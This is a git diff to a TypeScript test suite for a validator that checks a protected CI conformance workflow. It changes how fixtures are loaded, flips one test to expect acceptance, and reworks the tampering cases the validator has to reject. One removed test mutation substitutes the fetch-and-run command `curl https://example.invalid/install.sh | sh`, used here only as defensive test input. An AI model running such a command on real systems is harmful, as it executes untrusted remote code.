@@ -1,8 +1,9 @@
 import { execFileSync, spawnSync } from 'node:child_process';
 import { createHash } from 'node:crypto';
 import { existsSync, readFileSync } from 'node:fs';
+import { createRequire } from 'node:module';
 import { dirname, relative, resolve } from 'node:path';
-import { fileURLToPath, pathToFileURL } from 'node:url';
+import { fileURLToPath } from 'node:url';
 
 import * as ts from 'typescript';
 import { describe, expect, test } from 'vitest';
@@ -358,11 +359,18 @@ function verifyHardenedWorkflowGraph(workflow: string): void {
 }
 
 async function workflowFixture() {
-  const { verifyProtectedWorkflow } = await import(
-    pathToFileURL(resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs')).href
+  // Load the external committed validator with Node, outside Vite's module resolver.
+  const { verifyProtectedWorkflow } = createRequire(import.meta.url)(
+    resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
   );
   const workflow = readFileSync(workflowPath, 'utf8');
   const harness = readFileSync(harnessPath);
+  const frozenLock = JSON.parse(
+    readFileSync(
+      resolve(validatorRoot, 'conformance', 'client-v1-cross-repository-lock.json'),
+      'utf8',
+    ),
+  );
   const producerCommit = 'f'.repeat(40);
   const producer = {
     status: 'compatible',
@@ -383,6 +391,7 @@ async function workflowFixture() {
     command: 'test:phase1-conformance',
     recordSchemaVersion: 2,
     workflow: {
+      ...frozenLock.evidenceProducer.workflow,
       name: 'client-v1 conformance',
       path: '.github/workflows/client-v1-conformance.yml',
       size: Buffer.byteLength(workflow, 'utf8'),
@@ -626,7 +635,7 @@ ${childBootstrap.slice(validationStart, validationEnd)}
 });
 
 describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
-  test('is expected to be rejected by the pre-repin SDK workflow validator', async () => {
+  test('accepts the committed protected workflow with the current SDK validator', async () => {
     const fixture = await workflowFixture();
     expect(fixture.workflow).toContain('      validator_revision:');
     expect(fixture.workflow).toContain('        required: true');
@@ -642,7 +651,7 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
     expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
     expect(() =>
       fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
-    ).toThrow(/workflow/u);
+    ).not.toThrow();
   });
 
   test.each([
@@ -690,15 +699,15 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
     [
       'disabled Linux Secret Service setup',
       (workflow: string) =>
-        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
+        workflow.replace(
+          "      - name: Install Linux native dependencies\n        if: matrix.platform != 'win32-x64' && matrix.platform == 'linux-x64'",
+          '      - name: Install Linux native dependencies\n        if: false',
+        ),
     ],
     [
       'substituted Linux Secret Service setup',
       (workflow: string) =>
-        workflow.replace(
-          'node scripts/phase1-linux-secret-service.mjs --install',
-          'curl https://example.invalid/install.sh | sh',
-        ),
+        workflow.replace('gnome-keyring=46.1-2ubuntu0.2', 'gnome-keyring=0.0.0'),
     ],
     [
       'sibling action',
@@ -783,6 +792,7 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
   ])('rejects %s', async (_label, mutate) => {
     const fixture = await workflowFixture();
     const workflow = mutate(fixture.workflow);
+    expect(workflow).not.toBe(fixture.workflow);
     const producer = {
       ...fixture.producer,
       workflow: {
